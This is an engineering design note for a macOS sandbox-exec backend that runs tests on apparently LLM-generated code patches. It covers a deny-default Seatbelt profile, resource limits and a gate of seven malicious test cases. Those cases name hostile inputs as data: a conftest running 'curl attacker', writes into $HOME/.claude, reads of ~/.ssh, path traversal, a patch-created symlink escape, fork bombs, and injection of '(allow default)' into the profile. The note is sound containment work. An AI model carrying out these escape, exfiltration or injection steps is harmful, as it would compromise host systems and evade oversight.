## Runtime Probes (firsthand, this host, 2026-06-13)

- **Platform = macOS (Darwin arm64 26.5.1).** The RFC's Linux mechanisms are **ABSENT**: `unshare`/`nsenter`/`ip netns`/`cgcreate` all not-found → **no network namespaces, no cgroups, no overlay+chroot-via-unshare.** No `docker`/`colima`/`lima`/`podman` (daemon down). Even `timeout`/`setsid` are absent. — building W1 as the RFC literally words it would be the ADR-0012 anti-pattern (enforcement on an absent mechanism).
- **`sandbox-exec` is present (`/usr/bin/sandbox-exec`) AND FUNCTIONS** (smoke-tested): a process runs under a profile; `(deny file-write*)` **blocks** a write to `/tmp` (and `/dev/null` — so the real profile must ALLOW-list essentials, not deny-all-then-hope). It is the macOS Seatbelt MAC layer — Apple-DEPRECATED (still shipped + used internally) + macOS-only.
- **Interpreter path matters:** `node` is NOT at `/usr/bin/node` (smoke `execvp` failed). The profile must resolve the real interpreter/test-runner binary (`command -v`) and `(allow process-exec)` + `(allow file-read*)` it + its dylibs. A naive profile breaks exec.
- **Process-group reap works WITHOUT setsid/timeout:** Node `spawn(cmd, {detached:true})` + `process.kill(-pid, 'SIGKILL')` reaps the group (smoke ✓). `perl` (alarm) is also present as a wall-clock fallback.
- **`RLIMIT_AS` is IGNORED on macOS arm64** (`ulimit -v` = unlimited) → the **memory-DoS bound is WEAK** under sandbox-exec. Wall-clock + pid-count + pgid-kill hold; mem-bound is a DOCUMENTED RESIDUAL the Docker backend closes.
- **No collision:** `grep -rIl ContainerAdapter packages/lab` → 0 (W0 reserved the name in docs only). Net-new module.

### D1 — the pluggable backend interface (the "Docker later" seam)

A thin, backend-agnostic primitive (VERIFY-folded — `allowExecBinaries[]` added so exec-policy is a first-class input the DockerBackend honors via image+seccomp, not a sandbox-exec-only internal; `containmentProven` split into a backend-capability flag vs a per-run observation):

```
runInSandbox({ workDir, command, argv, allowReadPaths[], allowWritePaths[],
               allowExecBinaries[], wallClockMs, cpuSec, maxPids })
  -> { result_class, exitCode, signal, stdout, stderr, timedOut, killed_for_dos }
// result_class ∈ { CONTAINED_RESULT, SETUP_FAILURE, KILLED_FOR_DOS } — see D1.5
backend.containmentAttested: boolean   // a BACKEND capability flag, set ONLY by the D5 spike passing
```

`ContainerAdapter.run({ repo, base_sha, candidate_patch, test_patch, test_ids })` orchestrates the lifecycle over an injected **backend**. Backends:
- **`SandboxExecBackend`** (THIS wave, macOS) — generates a deny-default Seatbelt profile + `sandbox-exec -p <profile>` + Node-timeout + pgid-kill.
- **`MockBackend`** (THIS wave) — records calls, returns a scripted result; lets the PURE orchestration be CI-green on Linux with zero execution.
- **`DockerBackend` / `NamespaceBackend`** (LATER, deferred) — drops in behind the same interface. **D1 field → Docker mapping (the proof the seam doesn't leak):** `allowReadPaths`→`-v ro` binds · `allowWritePaths`→`rw` tmpfs/volume · `allowExecBinaries`→image + `--security-opt no-new-privileges` + seccomp · `wallClockMs`→`--stop-timeout` · `maxPids`→`--pids-limit` · deny-network→`--network none`.

Backend selected by capability-probe + env (`LOOM_SANDBOX_BACKEND`), failing CLOSED to "no behavioral leg" if no backend has `containmentAttested`.

### D1.5 — the result taxonomy (VERIFY must-fix #3 — conflation is a false-ALLOW)

`run()` distinguishes three outcomes; an unrecognized exit/signal DEFAULTS to `SETUP_FAILURE → refuse` (fail-closed). Reuses the calibration-run.js error discipline (`ETIMEDOUT` vs `status!==0` vs clean):
- **`SETUP_FAILURE`** — sandbox-exec couldn't apply the profile, the child never started (the **startup sentinel** — the sandboxed wrapper echoes a known marker as its FIRST action; absence ⇒ child never ran ⇒ containment-uncertain), or the backend threw mid-run → `run()` REFUSES (behavioral leg unavailable), NEVER an unsandboxed retry.
- **`CONTAINED_RESULT`** — the child ran under the attested profile and exited (tests passed OR legitimately failed) → parse FAIL_TO_PASS/PASS_TO_PASS normally. A test-failure is NOT a containment failure.
- **`KILLED_FOR_DOS`** — wall-clock/pid bound fired, pgid-killed.

### D2 — the deny-default Seatbelt profile (the containment core)

`(version 1) (deny default)` + a REALPATH-CANONICALIZED allow-list:
- **Canonicalize EVERY emitted allow-path (VERIFY CRITICAL — hacker live-triggered):** macOS resolves `/tmp`→`/private/tmp` and Seatbelt matches the kernel-RESOLVED vnode, so a `(subpath "/tmp/<workDir>")` rule SILENTLY DENIES the legit write. The profile generator runs `kernel/_lib/path-canonicalize.js` `canonicalize()` (realpath, resolves a symlinked ancestor even for a not-yet-existing leaf) on the workDir write-subpath, every `allowReadPaths`, and the interpreter (`command -v` THEN realpath).
- **Exec policy = inherited-deny is the wall, NOT a narrow allowlist (VERIFY must-fix #2):** Seatbelt confinement is INHERITED across fork/exec (hacker-probed: a child re-exec'd by conftest stays denied; nested `sandbox-exec` to widen is BLOCKED). So `(allow process-exec (subpath <system bin roots a real suite needs: /usr/bin,/bin,/usr/local,…>))` broadly — a real `pytest`/`Makefile` legitimately execs `make→cc→as→ld→git→sh`, and they all inherit `(deny network*)`+`(deny file-write*)`. `allowExecBinaries[]` narrows the audit surface where known. The containment does NOT rest on the exec list.
- `(allow file-read* ...)` the canonicalized clone dir **+ the resolved system-read floor** `(subpath "/usr") (subpath "/System") (subpath "/private/var/db/dyld")` — else node/python SIGABRT at startup (EXIT=134, the false-block the positive-control guards).
- `(allow file-write* (subpath <canonicalized scoped temp>))` + `/dev/null` — NOTHING ELSE (host fs, `$HOME`, `~/.claude` unreachable).
- `(deny network*)` — the exfil bound (kernel Seatbelt drop; hacker-probed: TCP, DNS, localhost-listener, AF_UNIX all denied).
- **Profile-string injection-safety (VERIFY fold):** the `.sb` is an s-expression built from `repo` (corpus-author-controlled). A `repo`/path with a `"`/`)`/newline could break out of a `(subpath "...")` and inject `(allow default)` — the `.sb` analog of SQLi. A pure `assertSafeProfilePath()` (reusing `isSafePathSegment`/`checkWithinRoot`) ESCAPES-or-REJECTS, never widens — the profile-gen analog of calibration-run.js's argv-array-not-string-concat.

### D3 — the read-mostly lifecycle (STANDALONE clone, not a worktree)

`git clone@base_sha into a scoped temp (a FRESH STANDALONE clone — .git INSIDE the temp, NO --local/hardlinks sharing the user's object store, else the sandboxed test reads the user's whole history + the worktree≠sandbox escape applies) — NEVER the user's HEAD/working tree (spike-S3) -> apply candidate_patch -> apply the UNMODIFIED test_patch -> run test_ids under the D2 profile -> parse -> DISCARD.` Read-mostly; no live-repo write, no egress, no host write beyond the scoped temp. (A candidate_patch that clobbers test_patch is W2's tamper-resistance job, RFC R3 — W1 just applies candidate THEN test, in that order.)

### D4 — resource bounding (exec-order matters; honest about the gap)

- **Exec order (VERIFY fold):** the ulimit wrapper runs UNDER sandbox-exec — `sandbox-exec -p <profile> /bin/sh -c 'ulimit -t <cpu>; ulimit -u <pids>; exec <runner>'` — NOT the reverse (else limits apply but network/fs containment does not).
- **Wall-clock:** Node timer → `process.kill(-pgid, 'SIGKILL')` (detached group; smoke ✓).
- **PID-count:** `ulimit -u` enforces on macOS (hacker-probed) BUT is **per-UID** (shared with the loom host + the user's session) — so a fork-bomb is bounded by **wall-clock + pgid-kill TOGETHER**, not the cap alone; a `setsid()`-escaping variant dodges `-pgid` → the spike measures host fork-availability DURING the run.
- **Memory:** WEAK — `RLIMIT_AS` ignored on macOS arm64 (confirmed live: `ulimit -v` unlimited). Bounded by wall-clock + pid; a hard mem-bound is the Docker backend's job (deferred).

### D5 — the spike-first green-or-block gate (the FIRST build step; the 7 cases the VERIFY board requires)

`backend.containmentAttested = true` ONLY if a **POSITIVE CONTROL runs GREEN** (the false-green guard — a too-tight read-allow SIGABRTs the runner at EXIT=134, which a naive gate misreads as "contained"; so a trivial passing test MUST execute green under the profile FIRST) **AND all 7 malicious cases are PROVEN blocked**:

1. **Inherited-deny holds across fork/exec** — a conftest execs `/bin/sh -c 'curl attacker'` + `/bin/sh -c 'echo x > $HOME/.claude/x'`; both blocked across the exec boundary (the load-bearing premise the broad-exec design rests on — prove LIVE first).
2. **Positive control GREEN** — a trivial passing pytest/node test runs + passes under the profile (read-allow is complete).
3. **Canonicalized write-subpath** — a write to the realpath `/private/tmp/<workDir>` is ALLOWED; one level outside is DENIED.
4. **Exfil blocked on all channels** — TCP-to-remote, DNS, localhost-listener-started-outside, AF_UNIX-inside-a-write-dir.
5. **FS-escape blocked** — `$HOME/.claude/` write, `~/.ssh` read, `$WORK/../evil` traversal, AND **an LLM-patch-CREATED in-clone symlink → $HOME written through** (the real vector, not just a pre-planted symlink).
6. **Fork-bomb reaped** — incl. a `setsid()` variant, killed by wall-clock + pgid before host fork-availability is exhausted.
7. **Fail-closed drives LIVE** — on an escape OR a backend throw / sandbox-exec-exits-before-the-child, `run()` returns REFUSE (`SETUP_FAILURE`, behavioral leg unavailable), never an unsandboxed retry — distinguishing "child never started" (absent sentinel) from "child ran + exited non-zero".

**If the positive control aborts OR any malicious case escapes → behavioral leg fail-CLOSED; v3.9 ships B+C-only with the honest caveat.** No "mostly works."
